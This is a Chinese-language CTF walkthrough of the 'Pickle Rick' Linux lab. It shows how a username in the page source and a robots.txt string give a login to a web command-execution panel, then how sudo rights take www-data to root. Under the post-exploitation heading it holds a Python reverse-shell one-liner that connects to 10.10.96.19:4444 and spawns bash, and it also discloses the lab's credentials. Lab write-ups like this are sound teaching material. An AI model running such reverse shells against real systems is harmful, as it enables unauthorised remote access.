---
sidebar_position: 4
tags: [Easy, Linux, 信息泄露, 命令执行, SUDO]
title: Pickle Rick
---
# Pickle Rick
## 端口扫描
![20240525123533](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123533.png)
![20240525123539](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123539.png)
#
## 80
![20240525123652](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123652.png)

查看网页根据其内容提示我们需要找到某些东西

![20240525123554](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123554.png)

:::tip
此时如果查看网页源码可以发现提示了一个用户名称 : `R1ckRul3s`
:::

![20240525123637](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123637.png)

在其中我们发现 robots.txt 文件给出了一段字符串 Wubbalubbadubdub

![20240525123707](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123707.png)

并且我们发现了一个登陆窗口, 我们尝试使用上面的内容作为账号和密码进行登陆, 发现可以登陆成功, 并且发现这其实是一个命令执行窗口, 所以我们可以尝试在此获取 SHELL

![20240525123721](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123721.png)

## 后渗透
### www-data

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.96.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
![20240525123743](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123743.png)

### www-data —> root
我发现用户 www-data 具有 SUDO 特权可以直接获取权限
![20240525123805](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123805.png)

![20240525123955](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525123955.png)
